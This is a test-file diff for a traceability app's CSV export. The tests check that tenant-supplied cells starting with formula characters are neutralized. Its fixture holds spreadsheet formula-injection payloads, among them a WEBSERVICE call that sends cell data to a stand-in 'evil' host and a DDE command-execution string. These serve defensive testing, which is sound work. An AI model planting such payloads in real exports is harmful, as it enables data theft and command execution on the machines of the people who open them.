@@ -475,3 +475,151 @@ def test_historical_tenant_scaled_scenario_is_still_illustrative(monkeypatch):
     assert result["is_illustrative"] is True
     assert result["demo_disclaimer"]
     assert result["data_source"] == "demo_with_tenant_context"
+
+
+# ---------------------------------------------------------------------------
+# _build_csv_export — formula-injection neutralization
+# ---------------------------------------------------------------------------
+
+
+class TestBuildCSVExportFormulaNeutralization:
+    """Cells starting with ``= + - @`` tab or CR must be neutralized.
+
+    The export rows carry tenant-influenced text (scenario names,
+    timeline entries, facility names). A hostile value such as
+    ``=WEBSERVICE(...)`` would execute on the reviewer's workstation
+    when the CSV is opened in Excel/Sheets, so every row passes
+    through ``sanitize_row`` before writing.
+    """
+
+    def _sim(self) -> dict:
+        return {
+            "id": "sim-formula",
+            "scenario_id": "romaine-ecoli",
+            "created_at": "2026-01-01T00:00:00Z",
+            "metrics": {
+                "scenario": '=WEBSERVICE("http://evil/?x="&A1)',
+                "contaminant": "E. coli O157:H7",
+                "total_lots_in_system": 47,
+                "affected_lots": 12,
+                "affected_locations": 23,
+                "states_affected": 8,
+                "without_regengine": {"response_time_hours": 18},
+                "with_regengine": {"response_time_minutes": 42},
+                "time_reduction_percent": 96,
+                "supply_chain_graph": {
+                    "nodes": [
+                        {
+                            "id": "loc-1",
+                            "name": "=cmd|' /C calc'!A0",
+                            "type": "@evil-type",
+                            "state": "S1",
+                            "affected": True,
+                            "lot_count": 3,
+                        },
+                    ],
+                    "links": [],
+                },
+                "timeline": [
+                    {
+                        "timestamp": "2026-02-26T06:00:00Z",
+                        "event": "+1+cmd|' /C calc'!A0",
+                        "location": "-evil-warehouse",
+                        "status": "@malicious",
+                    },
+                    {
+                        "timestamp": "2026-02-26T14:00:00Z",
+                        "event": "\t=HYPERLINK(\"http://evil\",\"click\")",
+                        "location": "\r=2+5+cmd",
+                        "status": "warning",
+                    },
+                ],
+            },
+        }
+
+    def test_timeline_cells_with_formula_prefixes_are_neutralized(self) -> None:
+        import csv as csv_mod
+        import io as io_mod
+
+        out = _build_csv_export(self._sim(), view="timeline")
+        parsed = list(csv_mod.DictReader(io_mod.StringIO(out)))
+        assert len(parsed) == 2
+        assert parsed[0]["scenario_name"] == "'=WEBSERVICE(\"http://evil/?x=\"&A1)"
+        assert parsed[0]["event"] == "'+1+cmd|' /C calc'!A0"
+        assert parsed[0]["location"] == "'-evil-warehouse"
+        assert parsed[0]["status"] == "'@malicious"
+        assert parsed[1]["event"] == "'\t=HYPERLINK(\"http://evil\",\"click\")"
+        assert parsed[1]["location"] == "'\r=2+5+cmd"
+        # Safe cells pass through unchanged.
+        assert parsed[0]["simulation_id"] == "sim-formula"
+        assert parsed[0]["timestamp"] == "2026-02-26T06:00:00Z"
+        assert parsed[1]["status"] == "warning"
+
+    def test_contact_list_facility_cells_are_neutralized(self) -> None:
+        import csv as csv_mod
+        import io as io_mod
+
+        out = _build_csv_export(self._sim(), view="contact_list")
+        parsed = list(csv_mod.DictReader(io_mod.StringIO(out)))
+        assert len(parsed) == 1
+        assert parsed[0]["facility_name"] == "'=cmd|' /C calc'!A0"
+        assert parsed[0]["facility_type"] == "'@evil-type"
+        assert parsed[0]["scenario_name"] == "'=WEBSERVICE(\"http://evil/?x=\"&A1)"
+        # Safe cells pass through unchanged.
+        assert parsed[0]["facility_id"] == "loc-1"
+        assert parsed[0]["notification_priority"] == "high"
+
+    def test_summary_view_safe_values_unchanged(self) -> None:
+        import csv as csv_mod
+        import io as io_mod
+
+        sim = self._sim()
+        sim["metrics"]["scenario"] = "E. coli O157:H7 in Romaine Lettuce"
+        out = _build_csv_export(sim, view="summary")
+        parsed = list(csv_mod.DictReader(io_mod.StringIO(out)))
+        assert len(parsed) == 1
+        assert parsed[0]["scenario_name"] == "E. coli O157:H7 in Romaine Lettuce"
+        assert parsed[0]["contaminant"] == "E. coli O157:H7"
+        assert parsed[0]["time_reduction_percent"] == "96"
+
+    def test_impact_graph_cells_with_formula_prefixes_are_neutralized(self) -> None:
+        import csv as csv_mod
+        import io as io_mod
+
+        sim = self._sim()
+        sim["metrics"]["supply_chain_graph"]["links"] = [
+            {
+                "source": "=evil-source",
+                "target": "+evil-target",
+                "affected": True,
+                "lot_codes": ["=LOT-1", "LOT-2"],
+            },
+        ]
+        out = _build_csv_export(sim, view="impact_graph")
+        parsed = list(csv_mod.DictReader(io_mod.StringIO(out)))
+        assert len(parsed) == 1
+        assert parsed[0]["source"] == "'=evil-source"
+        assert parsed[0]["target"] == "'+evil-target"
+        # lot_codes are joined with "," before sanitizing; the joined cell
+        # starts with "=" so the whole cell is neutralized as one field.
+        assert parsed[0]["lot_codes"] == "'=LOT-1,LOT-2"
+        assert parsed[0]["scenario_name"] == "'=WEBSERVICE(\"http://evil/?x=\"&A1)"
+
+    def test_csv_output_quotes_every_field(self) -> None:
+        import csv as csv_mod
+        import io as io_mod
+
+        sim = self._sim()
+        sim["metrics"]["scenario"] = "E. coli O157:H7 in Romaine Lettuce"
+        sim["metrics"]["contaminant"] = "ok;=1+1"
+        out = _build_csv_export(sim, view="summary")
+        lines = [line for line in out.splitlines() if line]
+        assert len(lines) == 2  # header plus one data row
+        for line in lines:
+            assert line.startswith('"'), f"unquoted CSV line: {line!r}"
+        # The semicolon value stays inside one quoted field and round-trips
+        # as a single cell, so a reader that splits on ";" cannot start a
+        # new cell on the "=".
+        assert '"ok;=1+1"' in lines[1]
+        parsed = list(csv_mod.DictReader(io_mod.StringIO(out)))
+        assert parsed[0]["contaminant"] == "ok;=1+1"
